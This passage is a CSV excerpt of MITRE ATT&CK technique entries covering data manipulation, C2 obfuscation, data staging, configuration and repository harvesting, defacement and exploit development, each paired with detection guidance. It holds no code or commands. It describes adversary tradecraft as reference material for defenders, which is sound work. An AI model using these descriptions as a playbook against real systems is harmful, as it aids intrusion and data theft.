T1565.001,attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292,Data Manipulation: Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565/001,02 March 2020,19 April 2022,enterprise-attack,1.1,Impact,"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.","Linux, Windows, macOS","File: File Creation, File: File Deletion, File: File Modification",True,T1565,,,,,,Integrity,,"(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Ready.gov IT DRP)"
T1565.002,attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6,Data Manipulation: Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",https://attack.mitre.org/techniques/T1565/002,02 March 2020,19 April 2022,enterprise-attack,1.1,Impact,"Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. ","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution",True,T1565,,,,,,Integrity,,"(Citation: Fortinet Metamorfo Feb 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FireEye APT38 Oct 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: ESET LightNeuron May 2019),"
T1001.001,attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade,Data Obfuscation: Junk Data,"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ",https://attack.mitre.org/techniques/T1001/001,15 March 2020,15 March 2020,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1001,,,,,,,,"(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FireEye APT28),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Dell P2P ZeuS),(Citation: TrendMicro BlackTech June 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET PLEAD Malware July 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Group IB GrimAgent July 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CISA WellMess July 2020),(Citation: ESET Sednit Part 3),(Citation: Securelist APT10 March 2021),(Citation: Unit42 BendyBear Feb 2021),"
T1001.003,attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc,Data Obfuscation: Protocol Impersonation,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  

Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",https://attack.mitre.org/techniques/T1001/003,15 March 2020,15 March 2020,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1001,,,,,,,,"(Citation: Scarlet Mimic Jan 2016),(Citation: US-CERT BADCALL),(Citation: US-CERT Bankshot Dec 2017),(Citation: ESET Okrum July 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET InvisiMole June 2018),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Zscaler Higaisa 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Novetta Blockbuster),(Citation: PWC KeyBoys Feb 2017),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: US-CERT HARDRAIN March 2018),(Citation: Mandiant APT41),(Citation: ESET InvisiMole June 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: McAfee GhostSecret),"
T1001.002,attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235,Data Obfuscation: Steganography,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",https://attack.mitre.org/techniques/T1001/002,15 March 2020,15 March 2020,enterprise-attack,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS",Network Traffic: Network Traffic Content,True,T1001,,,,,,,,"(Citation: ESET LightNeuron May 2019),(Citation: Symantec W32.Duqu),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Unit42 RDAT July 2020),(Citation: Novetta-Axiom),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Symantec Sunburst Sending Data January 2021),(Citation: GitHub Sliver HTTP),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ESET Dukes October 2019),(Citation: FireEye APT29),(Citation: Proofpoint TA459 April 2017),(Citation: Trend Micro Daserf Nov 2017),"
T1074.001,attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c,Data Staged: Local Data Staging,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",https://attack.mitre.org/techniques/T1074/001,13 March 2020,21 April 2022,enterprise-attack,1.1,Collection,"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Consider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.","Linux, Windows, macOS","Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Modification",True,T1074,,"Massimiliano Romano, BT Security",,,,,,"(Citation: Unit 42 BadPatch Oct 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: Palo Alto Rover),(Citation: ESET TeleBots Oct 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Forcepoint Monsoon),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cybereason PowerLess February 2022),(Citation: aptsim),(Citation: ESET Sednit USBStealer 2014),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Objective-See MacMa Nov 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Novetta Blockbuster),(Citation: Securelist Calisto July 2018),(Citation: TrendMicro Ursnif Mar 2015),(Citation: ESET Carbon Mar 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Talos MuddyWater Jan 2022),(Citation: Mandiant APT41),(Citation: Microsoft SIR Vol 19),(Citation: CISA AA20-301A Kimsuky),(Citation: Accenture Dragonfish Jan 2018),(Citation: US-CERT TA18-074A),(Citation: FireEye APT30),(Citation: Symantec Catchamas April 2018),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: CISA EB Aug 2020),(Citation: FireEye Periscope March 2018),(Citation: Novetta Blockbuster Loaders),(Citation: ESET Attor Oct 2019),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Checkpoint IndigoZebra July 2021),(Citation: McAfee Gold Dragon),(Citation: ESET InvisiMole June 2018),(Citation: Mandiant UNC3890 Aug 2022),(Citation: PWC Cloud Hopper April 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Kaspersky MoleRATs April 2019),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Cylance Machete Mar 2017),(Citation: ESET Crutch December 2020),(Citation: Symantec Darkmoon Aug 2005),(Citation: Talos NavRAT May 2018),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: Cylance Dust Storm),(Citation: SentinelLabs Metador Sept 2022),(Citation: FireEye MESSAGETAP October 2019),(Citation: Mandiant FIN13 Aug 2022),(Citation: Bitdefender Naikon April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: ESET Machete July 2019),(Citation: Malwarebytes Dyreza November 2015),(Citation: Secureworks Karagany July 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: FoxIT Wocao December 2019),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Gelsemium June 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET Operation Groundbait),(Citation: Palo Alto OilRig May 2016),(Citation: Symantec Dragonfly),(Citation: McAfee Honeybee),(Citation: FireEye NETWIRE March 2019),(Citation: ESET Sednit Part 2),(Citation: Symantec Calisto July 2018),(Citation: Eset Ramsay May 2020),(Citation: Mandiant UNC3313 Feb 2022),(Citation: ATT Sidewinder January 2021),(Citation: Palo Alto MoonWind March 2017),(Citation: FireEye FIN6 April 2016),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Symantec W32.Duqu),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: Avira Mustang Panda January 2020),(Citation: NCC Group Chimera January 2021),(Citation: Antiy CERT Ramsay April 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kroll RawPOS Jan 2017),(Citation: CyberBit Dtrack),(Citation: BlackBerry CostaRicto November 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: FireEye TRITON 2019),(Citation: Kaspersky Sofacy),(Citation: Securelist Dtrack),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Kroll Qakbot June 2020),(Citation: ESET LightNeuron May 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1074.002,attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0,Data Staged: Remote Data Staging,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",https://attack.mitre.org/techniques/T1074/002,13 March 2020,08 March 2021,enterprise-attack,1.1,Collection,"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Access, File: File Creation",True,T1074,,Praetorian,,,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: FireEye FIN6 April 2016),(Citation: NCC Group Chimera January 2021),(Citation: Volexity SolarWinds),(Citation: MoustachedBouncer ESET August 2023),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: PWC Cloud Hopper April 2017),(Citation: McAfee Night Dragon),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec Cicada November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1602.002,attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd,Data from Configuration Repository: Network Device Configuration Dump,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.

Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",https://attack.mitre.org/techniques/T1602/002,20 October 2020,17 February 2022,enterprise-attack,1.0,Collection,Identify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration.(Citation: US-CERT TA18-068A 2018),Network,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1602,,,Administrator,,,,,",(Citation: Cisco Blog Legacy Device Attacks),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Securing SNMP),(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)"
T1602.001,attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5,Data from Configuration Repository: SNMP (MIB Dump),"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).

The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.

Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",https://attack.mitre.org/techniques/T1602/001,19 October 2020,22 October 2020,enterprise-attack,1.0,Collection,Identify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities),Network,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content",True,T1602,,,Administrator,,,,,",(Citation: US-CERT-TA18-106A),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Cisco Securing SNMP),(Citation: Cisco Blog Legacy Device Attacks)"
T1213.003,attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3,Data from Information Repositories: Code Repositories,"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.

Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",https://attack.mitre.org/techniques/T1213/003,11 May 2021,18 October 2022,enterprise-attack,1.1,Collection,"Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.",SaaS,"Application Log: Application Log Content, Logon Session: Logon Session Creation",True,T1213,,"Itamar Mizrahi, Cymptom; Josh Liburdi, @jshlbrd; Toby Kohlenberg",,,,,,"(Citation: Microsoft Internal Solorigate Investigation Blog),(Citation: NCC Group LAPSUS Apr 2022),(Citation: MSTIC DEV-0537 Mar 2022),"
T1213.001,attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc,Data from Information Repositories: Confluence,"
Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
",https://attack.mitre.org/techniques/T1213/001,14 February 2020,08 June 2021,enterprise-attack,1.0,Collection,"Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.

User access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.",SaaS,"Application Log: Application Log Content, Logon Session: Logon Session Creation",True,T1213,,,User,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),"
T1213.002,attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a,Data from Information Repositories: Sharepoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
",https://attack.mitre.org/techniques/T1213/002,14 February 2020,08 June 2021,enterprise-attack,1.0,Collection,"The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. 

","Office 365, Windows","Application Log: Application Log Content, Logon Session: Logon Session Creation",True,T1213,,,User,,,,,"(Citation: NCC Group APT15 Alive and Strong),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: NCC Group LAPSUS Apr 2022),(Citation: NCC Group Chimera January 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: RSAC 2015 Abu Dhabi Stefano Maccaglia),"
T1491.002,attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3,Defacement: External Defacement,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",https://attack.mitre.org/techniques/T1491/002,20 February 2020,25 March 2022,enterprise-attack,1.2,Impact,"Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","IaaS, Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content",True,T1491,,,,,,Integrity,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: UK NCSC Olympic Attacks October 2020),(Citation: Ready.gov IT DRP)"
T1491.001,attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103,Defacement: Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1491/001,20 February 2020,28 July 2022,enterprise-attack,1.1,Impact,"Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","Linux, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content",True,T1491,,,,,,Integrity,,"(Citation: Minerva Labs Black Basta May 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: Avertium Black Basta June 2022),(Citation: BlackBerry Black Basta May 2022),(Citation: Check Point Meteor Aug 2021),(Citation: Fortinet Diavol July 2021),(Citation: Novetta Blockbuster Destructive Malware),(Citation: CERT-EE Gamaredon January 2021),(Citation: NCC Group Black Basta June 2022),(Citation: Cyble Black Basta May 2022),(Citation: Trend Micro Black Basta May 2022),(Citation: Microsoft BlackCat Jun 2022),(Citation: Check Point Black Basta October 2022),(Citation: Sophos BlackCat Jul 2022),(Citation: Ready.gov IT DRP)"
T1587.002,attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf,Develop Capabilities: Code Signing Certificates,"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",https://attack.mitre.org/techniques/T1587/002,01 October 2020,17 October 2021,enterprise-attack,1.1,Resource Development,"Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,Malware Repository: Malware Metadata,True,T1587,,,,,,,,"(Citation: ESET Lazarus Jun 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Unit 42 BackConfig May 2020),"
T1587.003,attack-pattern--1cec9319-743b-4840-bb65-431547bce82a,Develop Capabilities: Digital Certificates,"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).

Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).

After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",https://attack.mitre.org/techniques/T1587/003,01 October 2020,16 October 2021,enterprise-attack,1.2,Resource Development,"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)

Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,Internet Scan: Response Content,True,T1587,,,,,,,,"(Citation: PWC WellMess July 2020),(Citation: PWC WellMess C2 August 2020),(Citation: Talos Promethium June 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),"
T1587.004,attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2,Develop Capabilities: Exploits,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)

As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.

Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",https://attack.mitre.org/techniques/T1587/004,01 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System 